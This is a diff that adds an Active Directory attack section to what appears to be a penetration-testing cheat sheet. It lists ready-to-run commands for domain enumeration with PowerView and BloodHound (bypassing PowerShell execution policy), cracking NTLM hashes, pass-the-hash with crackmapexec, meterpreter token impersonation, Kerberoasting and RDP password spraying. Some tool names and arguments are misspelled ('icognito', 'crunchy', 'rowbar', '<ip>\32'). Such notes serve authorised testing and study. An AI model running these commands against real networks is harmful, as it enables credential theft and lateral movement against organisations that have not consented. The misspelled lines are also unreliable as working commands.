@@ -510,6 +510,93 @@ Active Directory
 
 <br>
 
+`Manual`
+
+         ipconfig /all  
+         route print  
+         arp -a  
+         netstat -ano  
+         C:\WINDOWS\System32\drivers\etc\hosts  
+         netsh firewall show state  
+         netsh firewall show config  
+         netsh dump  
+         net user  
+         net user /domain  
+         net group /domain  
+    
+<br>
+
+`Powerview`
+
+         powershell -ep bypass  
+         . .\powerview.ps1  
+         net accounts  
+         Get-NetDomain  
+         Get-NetDomainController  
+         Get-DomainPolicy  
+         Get-NetUser  
+         Get-NetUser | select cn  
+         Get-NetUser | select samaccountname  
+         Get-NetComputer  
+         Get-NetGroup  
+         Get-NetGroupMember  
+         Get-DomainUser -SPN  
+         Get-NetLoggedon -ComputerName <pc-name>  
+         Get-NetSession -ComputerName <pc-name>  
+         Invoke-ShareFinder  
+         Get-NETGPO  
+         Invoke-Kerberoast  
+         
+<br>
+ 
+`Bloodhound`
+
+         powershell -ep bypass  
+         . .\sharphound.ps1  
+         Invoke-BloodHound -CollectionMethod All -Domain <domain> -ZipFileName file.zip  
+         Download zip onto kali, import into bloodhound  
+         
+<br>
+
+`Cracking Ad Hashes`
+
+-    ntlm  
+     `hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt`  
+
+-    ntlmv2  
+     `hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt`  
+<br>
+
+`PASS THE PW & HASH`
+
+-    `crackmapexec <ip>/24 -u <user> -d <DOMAIN> -p <password>`  
+-    `crackmapexec <protocol> <ip>/24 -u <user> -H <hash> --local`  
+
+`Token Impersonation`
+     
+         meterpreter load icognito  
+         list_tokens  
+         impersonate_token <token>  
+         
+<br>
+
+`Kerberoasting`
+
+         Invoke-Kerberoast in powerview  
+         Invoke-Kerberoast -OutputFormat Hashcat | Select-Object Hash | Out-File -filepath 'c:\temp\hashcapture.txt' -width 8000  
+         
+<br>
+
+`Password Spraying`
+
+ -   Create Password List  
+     `crunchy <length> <length> -t <pw-core>%%%% `
+   
+-    Spray
+     `rowbar -b rdp -s <ip>\32 -U users.txt -C pw.txt -n 1`
+     
+<br>
+
 Pivoting & Port Forwarding
 ===============================================================================================
 
